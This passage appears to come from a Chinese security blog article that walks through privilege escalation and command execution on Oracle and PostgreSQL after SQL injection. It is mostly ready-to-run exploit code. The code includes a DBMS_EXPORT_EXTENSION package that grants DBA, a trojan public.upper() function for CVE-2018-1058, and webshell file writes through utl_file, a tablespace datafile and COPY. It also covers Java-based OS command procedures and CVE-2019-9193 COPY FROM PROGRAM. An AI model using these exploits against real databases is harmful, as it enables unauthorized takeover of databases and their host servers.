过程存在PL/SQL注入漏洞，允许低权限用户以DBA权限执行任意SQL
代码，此项为Oracle 10g经典提权漏洞。
先查询用户权限：
`select * from user_role_privs;`
创建程序包:
Create or REPLACE
PACKAGE HACKERPACKAGE AUTHID CURRENT_USER
IS
FUNCTION ODCIIndexGetMetadata (oindexinfo SYS.odciindexinfo,P3
VARCHAR2,p4 VARCHAR2,env
SYS.odcienv)
RETURN NUMBER;
END;
/
创建程序包体：
Create or REPLACE PACKAGE BODY HACKERPACKAGE
IS
FUNCTION ODCIIndexGetMetadata (oindexinfo SYS.odciindexinfo,P3
VARCHAR2,p4 VARCHAR2,env
SYS.odcienv)
RETURN NUMBER
IS
pragma autonomous_transaction;
BEGIN
EXECUTE IMMEDIATE 'GRANT DBA TO test';
COMMIT;
RETURN(1);
END;
END;
/
创建过程：
DECLARE
INDEX_NAME VARCHAR2(200);
INDEX_SCHEMA VARCHAR2(200);
TYPE_NAME VARCHAR2(200);
TYPE_SCHEMA VARCHAR2(200);
VERSION VARCHAR2(200);
NEWBLOCK PLS_INTEGER;
GMFLAGS NUMBER;
v_Return VARCHAR2(200);
BEGIN
INDEX_NAME := 'A1';
INDEX_SCHEMA := 'TEST';
TYPE_NAME := 'HACKERPACKAGE';
TYPE_SCHEMA := 'TEST';
VERSION := '10.2.0.2.0';
GMFLAGS := 1;
v_Return :=
SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_METADATA(INDEX_NAME
=>
INDEX_NAME,
INDEX_SCHEMA=> INDEX_SCHEMA,
TYPE_NAME => TYPE_NAME,
TYPE_SCHEMA => TYPE_SCHEMA,
VERSION => VERSION,
NEWBLOCK => NEWBLOCK,
GMFLAGS => GMFLAGS);
END;
/
再次查看用户权限：
EXP地址:
`https://www.exploit-db.com/exploits/1719`
PostgreSQL数据库用户权限
提升漏洞编号：CVE-2018-1058
利用范围：PostgreSQL数据库版本9.3-10
原理：当数据库用户创建一个数据库时，PostgreSQL会创建一个叫
public的模式，任何用户都可以在public模式下创建对象，若不进
行其他配置设定修改的情况下，默认查询等操作都是优先在public
中进行查询。
如select * from a等价于select * from public.a。
而名字相同的对象可以在相同数据库的不同模式下存在，也就是一
个用户可以修改其他用户的查询行为，所以我们只需要通过在publi
c模式下植入一个常见函数，比如转换大小写的函数lower(text)和
upper(text)，函数功能为当此函数被超级用户调用执行时，将超
级用户权限赋予低权限用户即可实现用户权限提升。
利用步骤详情：
1.查看tiquan用户是否具有超级用户权限。
2.tiquan用户创建表并插入数据。
`CREATE TABLE public.tiquan AS SELECT 'tiquan'::varchar AS
contents;`
3.tiquan用户定义upper()函数。
CREATE FUNCTION public.upper(varchar) RETURNS TEXT AS $$
ALTER ROLE tiquan SUPERUSER;
SELECT pg_catalog.upper($1);
$$ LANGUAGE SQL VOLATILE;
4.超级用户查询时候使用upper函数，此时已经执行了ALTER ROLE
tiquan SUPERUSER。
5.再次查看tiquan用户权限，成功提权至超级用户。
写入webshell
Oracle写入webshell
1.利用存储过程写入webshell。
a.创建webshell目录为站点绝对路径(需要已知绝对路径)。
create or replace directory WEBSHELL_DIR as 'C:\apache-tomcat-
8.5.56\webapps\Shopping';
b.利用存储过程写入一句话木马。
declare
webshell_file utl_file.file_type;
begin
webshell_file := utl_file.fopen('WEBSHELL_DIR', '1.jsp',
'W');
utl_file.put_line(webshell_file, '');
utl_file.fflush(webshell_file);
utl_file.fclose(webshell_file);
end;
/
c.写入成功
d.成功连接
2.利用数据库表空间结构写入文件先创建表空间，根据文件大小可
相应修改表空间。
create tablespace jsptest datafile 'C:\apache-tomcat-
8.5.56\webapps\Shopping\1.jsp' size 100k nologging;
创建表名并设置要插入字符的长度，此处先测试js代码，设置长度
为100。
create table webshell(C varchar2(100)) tablespace jsptest;
写入要执行的代码：
insert into WEBSHELL values(');
提交数据：
commit;
提交后必须同步数据至当前表空间：
alter tablespace jsptest offline;
删除表空间：
drop tablespace jsptest including contents;
访问jsp文件：
PostgreSQL写入shell
直接利用copy函数将文件写入指定目录(需要已知绝对路径且对目录
具有可操作权限)。
uid=1;copy (select '') to
'C:\Users\test\Desktop\php\phpStudy\WWW\1.php';
提权
Oracle提权
因为java大多是以system权限运行，所以当oracle通过java获得
命令执行权限时，便相当于间接获得了system权限，因此通过java
权限命令执行也可以作为Oracle的提权过程。
1.利用java权限提权
a.先使用dba权限赋予用户java运行权限。
b.创建java包。
select dbms_xmlquery.newcontext('declare PRAGMA
AUTONOMOUS_TRANSACTION;begin execute immediate ''create or
replace and compile java source named "LinxUtil" as import
java.io.*; public class LinxUtil extends Object {public static
String runCMD(String args) {try{BufferedReader myReader= new
BufferedReader(new InputStreamReader(
Runtime.getRuntime().exec(args).getInputStream() ) ); String
stemp,str="";while ((stemp = myReader.readLine()) != null) str
+=stemp+"\n";myReader.close();return str;} catch (Exception
e){return e.toString();}}}'';commit;end;') from dual;
c.获取java获取权限。
select dbms_xmlquery.newcontext('declare PRAGMA
AUTONOMOUS_TRANSACTION;begin execute immediate ''begin
dbms_java.grant_permission( ''''SYSTEM'''',
''''SYS:java.io.FilePermission'''', ''''>'''',''''EXECUTE'''');end;''commit;end;') from dual;
d.创建执行命令的函数select。
dbms_xmlquery.newcontext('declare PRAGMA
AUTONOMOUS_TRANSACTION;begin execute immediate ''create or
replace function shell(p_cmd in varchar2) return varchar2 as
language java name ''''LinxUtil.runCMD(java.lang.String) return
String''''; '';commit;end;') from dual;
e.执行命令。
select shell('whoami') from dual;
2.利用存储过程提权
oracle也可以利用存储过程来进行命令执行，当用户拥有创建存储
过 程 权 限 时 ， 则 可 以 创 建 一 个 java
class，然后用创建一个存储过程来进行调用。
a.查看权限发现用户具有create procedure权限。
b.创建一个java class然后用procedure包装它进行调用。
create or replace and resolve java source named CMD as
import java.lang.*;
import java.io.*;
public class CMD
{
public static void execmd(String command) throws
IOException
{
Runtime.getRuntime().exec(command);
}
}
/
c.创建存储进程。
create or replace procedure CMDPROC(command in varchar) as
language java
name 'CMD.execmd(java.lang.String)';
/
d.执行命令。
e.执行成功。
PostgreSQL命令执行
高权限命令执行漏洞CVE-2019-9193。
从9.3版本开始，PostgreSQL实现了导入导出数据的命令“COPY
TO/FROM
PROGRAM”，而此命令允许数据库超级用户以及“pg_read_serve
r_files”组内用户执行上任意操作系统命令。
利用条件：
1.postgresql数据库版本在9.3-11.2。
2.执行数据库语句用户为超级用户或者“pg_read_server_files
”组用户，pg_read_server_files角色权限可以执行copy命令，
且此权限为11版本新增角色，11版本以下需要超级用户权限。
接下来开始命令执行步骤：
创建用来保存命令输出的表。
DROP TABLE IF EXISTS rce;
CREATE TABLE rce(rce_output text);
通过“COPY FROM PROGRAM”执行系统命令。
COPY rce FROM PROGRAM 'whoami';
查看执行结果：
SELECT * FROM rce;
总结
本篇文章重点在于制作了Oracle与PostgreSQL数据库从注入到提
权的一个全家桶套餐，但注入到提权的路有很多条，不能局限于本
文的几条，希望师傅们可以多学习多总结，制作一个属于自己的吮
指原味新奥尔良奶油芝士豪华全家桶。
精选留言
用户设置不下载评论